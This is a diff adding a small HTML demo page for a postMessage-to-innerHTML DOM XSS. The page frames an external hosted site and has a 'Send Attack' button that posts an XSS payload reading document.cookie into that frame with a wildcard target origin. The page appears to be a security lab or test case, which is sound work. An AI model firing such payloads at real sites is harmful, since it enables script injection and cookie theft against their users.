@@ -1,0 +1,29 @@
+<html>
+<head>
+ <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+<body>
+	<h1>HTML5 PostMessage -> element.innerHTML</h1>
+	<hr />
+	<p><b>Source: </b> PostMessage</p>
+	<p><b>Sink: </b> element.innerHTML</p>
+	<hr/>
+	
+	<div class="row">
+		<div class="col-md-4">
+			<div class="embed-responsive embed-responsive-16by9" ">
+				<iframe src="https://axel-93-ekdahl.000webhostapp.com/" name="siteb"></iframe>
+			</div>
+		</div>
+	</div>
+	<div class="row">
+	<div class="col-md-2">
+		<button class="form-control btn btn-danger"onclick="frames[0].postMessage('<img src=x onerror=alert(document.cookie) />','*')">Send Attack</button> 
+		</div>
+	</div>
+	<script>
+		document.cookie ="new cookie";
+	</script>
+</body>
+</html>
